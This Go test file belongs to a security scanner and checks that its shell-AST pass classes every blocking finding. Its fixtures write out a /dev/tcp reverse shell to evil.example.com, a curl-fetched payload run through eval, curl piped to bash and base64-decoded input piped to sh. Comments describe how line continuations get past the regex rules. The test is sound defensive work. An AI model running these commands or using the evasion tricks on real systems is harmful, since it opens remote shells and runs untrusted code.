package scan

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/skael-dev/skael/internal/gate"
)

// TestBlockingFindingsAllHaveAClass is the guard TestEveryRuleHasAClass cannot
// be: that test only walks scan.AllRules(), and the shell-AST pass
// (shellast.go) emits findings without ever constructing a Rule, so it is
// structurally invisible to a rule-registry guard. This test instead runs the
// real scanner end-to-end over a fixture directory and asserts every
// blocking-severity finding (critical or high — the severities Decide treats
// as unappealable-unless-classed) carries a Class that gate.ClassOf
// recognises. It exercises all four shell-AST rules: DANGEROUS_SHELL,
// CODE_EXECUTION, DATA_EXFILTRATION, and OBFUSCATION.
func TestBlockingFindingsAllHaveAClass(t *testing.T) {
	dir := t.TempDir()

	// Each construct below is deliberately split across lines with a shell
	// line-continuation (backslash-newline) so the AST pass — which joins
	// continuations into one logical word/pipeline before analyzing — is the
	// only pass that can see it; the line-based regex rules (which run first
	// and would otherwise win the rule+file+line dedup with an
	// already-correctly-classed duplicate, masking a class bug in the
	// shell-AST emitter) see only the broken-apart fragments and don't match.
	// This is what makes the fixture actually exercise the AST pass's own
	// Class assignment rather than shadowing it.
	files := map[string]string{
		// DANGEROUS_SHELL (critical): /dev/tcp reverse shell, host split by a
		// line continuation mid-word.
		"reverse-shell.sh": "#!/bin/sh\nexec 3<>/dev/tcp/evil.example.co\\\nm/4444\ncat <&3\n",
		// CODE_EXECUTION (high): eval of a command substitution — the regex
		// rule only matches eval directly followed by ( " ' or a backtick, so
		// `eval $(...)` already slips past it with no line-splitting needed.
		"eval.sh": "#!/bin/sh\neval $(curl http://evil.example.com/payload)\n",
		// DATA_EXFILTRATION (critical): remote content piped to a shell,
		// split across a line continuation before the pipe.
		"pipe-to-shell.sh": "#!/bin/sh\ncurl https://evil.example.com/install.sh \\\n  | bash\n",
		// OBFUSCATION (critical): base64-decoded content piped to a shell,
		// split across line continuations before each pipe.
		"decode-to-shell.sh": "#!/bin/sh\ncat payload.b64 \\\n | base64 --decode \\\n | sh\n",
	}
	for name, content := range files {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o644); err != nil {
			t.Fatalf("write fixture %s: %v", name, err)
		}
	}

	report, err := ScanDir(dir)
	if err != nil {
		t.Fatalf("ScanDir: %v", err)
	}

	wantRules := map[string]bool{
		"DANGEROUS_SHELL":   false,
		"CODE_EXECUTION":    false,
		"DATA_EXFILTRATION": false,
		"OBFUSCATION":       false,
	}

	// knownClasses is every value gate.Class can hold. A finding's Class must
	// be one of these — not merely non-empty — since a typo'd class string
	// would pass an empty-check but still be meaningless to Decide.
	knownClasses := map[gate.Class]bool{
		gate.ClassExfiltration: true,
		gate.ClassSecret:       true,
		gate.ClassExecution:    true,
		gate.ClassInjection:    true,
		gate.ClassHeuristic:    true,
	}

	sawBlocking := false
	for _, f := range report.Findings {
		if _, tracked := wantRules[f.Rule]; tracked {
			wantRules[f.Rule] = true
		}
		if f.Severity != "critical" && f.Severity != "high" {
			continue
		}
		sawBlocking = true
		if f.Class == "" {
			t.Errorf("blocking finding %q (severity %s, file %s:%d) has no Class", f.Rule, f.Severity, f.File, f.Line)
			continue
		}
		if !knownClasses[gate.Class(f.Class)] {
			t.Errorf("blocking finding %q has Class %q that is not a recognised gate.Class", f.Rule, f.Class)
		}
	}

	if !sawBlocking {
		t.Fatal("fixture produced no critical/high finding; test is vacuous")
	}
	for rule, hit := range wantRules {
		if !hit {
			t.Errorf("fixture did not trigger expected rule %q; test does not cover it", rule)
		}
	}
}
